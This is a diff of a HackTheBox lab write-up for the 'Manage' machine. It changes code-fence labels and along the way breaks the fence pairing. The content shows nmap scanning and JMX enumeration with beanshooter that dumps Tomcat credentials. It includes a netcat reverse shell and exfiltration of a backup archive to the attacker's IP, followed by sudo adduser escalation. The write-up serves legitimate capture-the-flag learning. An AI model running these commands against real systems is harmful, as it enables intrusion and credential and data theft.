@@ -5,7 +5,7 @@ categories: [HackTheBox Writeups]
 tags: [hackthebox, linux]
 ---
 
-```
+```bash
 ares@legion:~/HackTheBox/Manage$ sudo nmap -sVC -A -T4 $target
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-22 12:21 EST
 Stats: 0:00:19 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
@@ -55,13 +55,12 @@ Nmap done: 1 IP address (1 host up) scanned in 49.49 seconds
 ```
 https://github.com/qtc-de/beanshooter
 
-```
+```bash
 java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.129.234.57 2222  
 ```
 ![20251122200710.png](/assets/img/htb-writeups/Pasted image 20251122200710.png)
 ![20251122200725.png](/assets/img/htb-writeups/Pasted image 20251122200725.png)
-```
-[+]     - Listing 2 tomcat users:
+```bash
 [+]
 [+]             ----------------------------------------
 [+]             Username:  manager
@@ -74,31 +73,29 @@ java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.129.234.57 2222
 [+]             Password:  onyRPCkaG4iX72BrRtKgbszd
 [+]             Roles:
 [+]                        Users:type=Role,rolename="role1",database=UserDatabase
-```
-
+```bash
 Payload // No authentification:
-```
+```bash
 java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.129.234.57 2222 tonka
 ```
 ![20251122200833.png](/assets/img/htb-writeups/Pasted image 20251122200833.png)
 
 Now we can trigger a shell:
-```
+```bash
 java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.129.234.57 2222
 ```
 ![20251122201639.png](/assets/img/htb-writeups/Pasted image 20251122201639.png)
 OR
-```
+```bash
 java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard exec 'nc 10.10.14.97 1234 -e ash' 
-```
-
+```bash
 ```
 nc -lvp 1234 > backup.tar.gz
 
 [tomcat@10.129.234.57 /home/useradmin/backups]$ nc 10.10.14.97 1234 < backup.tar.gz
 
 tar -xvzf backup.tar.gz
-```
+```bash
 ![20251122202241.png](/assets/img/htb-writeups/Pasted image 20251122202241.png)
 
 
@@ -112,5 +109,5 @@ User useradmin may run the following commands on manage:
     (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
 
 useradmin@manage:~$ sudo /usr/sbin/adduser admin
-```
+```bash
 ![20251122202955.png](/assets/img/htb-writeups/Pasted image 20251122202955.png)
